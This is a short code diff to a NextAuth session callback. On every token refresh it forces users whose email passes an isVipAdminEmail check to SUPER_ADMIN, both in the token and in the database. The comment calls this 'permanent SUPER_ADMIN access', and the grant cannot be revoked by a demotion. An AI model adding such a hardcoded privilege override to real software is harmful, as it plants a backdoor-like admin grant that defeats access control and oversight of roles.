@@ -97,15 +97,24 @@ export const authOptions: NextAuthOptions = {
                 typeof token.walletPoints !== "number";
 
             if (shouldRefresh) {
-                const dbUser = await User.findById(uid).select("role walletPoints loyaltyTier").lean() as {
+                const dbUser = await User.findById(uid).select("role walletPoints loyaltyTier email").lean() as {
                     role?: string;
                     walletPoints?: number;
                     loyaltyTier?: string;
+                    email?: string;
                 } | null;
 
                 if (dbUser) {
+                    let role = dbUser.role ?? "USER";
+                    
+                    // 🚀 FORCE VIP UPGRADE: Ensure permanent SUPER_ADMIN access
+                    if (isVipAdminEmail(dbUser.email) && role !== "SUPER_ADMIN") {
+                        await User.findByIdAndUpdate(uid, { $set: { role: "SUPER_ADMIN" } });
+                        role = "SUPER_ADMIN";
+                    }
+
                     token.id = uid;
-                    token.role = dbUser.role ?? "USER";
+                    token.role = role;
                     token.walletPoints = Number(dbUser.walletPoints) || 0;
                     token.loyaltyTier = dbUser.loyaltyTier ?? "Silver Vault";
                 } else if (user) {
